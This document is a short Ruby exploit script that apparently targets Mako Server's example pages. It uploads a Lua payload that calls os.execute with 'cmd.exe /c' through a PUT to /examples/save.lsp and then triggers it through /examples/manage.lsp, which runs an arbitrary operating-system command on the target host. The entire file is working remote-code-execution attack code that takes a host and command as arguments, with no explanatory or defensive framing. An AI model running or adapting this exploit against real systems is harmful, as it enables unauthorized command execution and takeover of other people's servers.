#!/usr/bin/env ruby 
# runs arbitrary os commands via lua os.execute() 
# https://makoserver.net/
require 'rex'

host = ARGV[0]
cmd  = ARGV[1] || "calc.exe"

def usage
	puts "[*] #{$0} <host> [cmd]"
	exit
end

usage if ARGV.size < 1

sock = Rex::Proto::Http::Client.new(host, port = "443", context = {}, ssl = true)

lua = "os.execute(\"cmd.exe /c #{cmd}\")"

req = sock.request_cgi(
	{
		'uri'   => "/examples/save.lsp?ex=2.1",
		'version' => '1.1',
		'method' => 'PUT',
		'data' => lua,
		'ctype' => "text/plain;charset=UTF-8",
		'cookie' => "z9ZAqJtI=110f08a45a1483bf",
		'headers' => {
			'Referer' => "http://host/Lua-Types.lsp",
			'Connection' => "close",
			'X-Requested-With' => "XMLHttpRequest",
		},
	})

	sock.send_request(req)
	data = sock.read_response()
	
	if data and data.code == 204
		req = sock.request_raw({
                	'uri'   => "/examples/manage.lsp?execute=true&ex=2.1&type=lua",
                	'cookie' => "z9ZAqJtI=110f08a45a1483bf",
        	})
                sock.send_request(req)
		puts "[*] Sending command '#{cmd}'..."
        	#data = sock.read_response()
	end
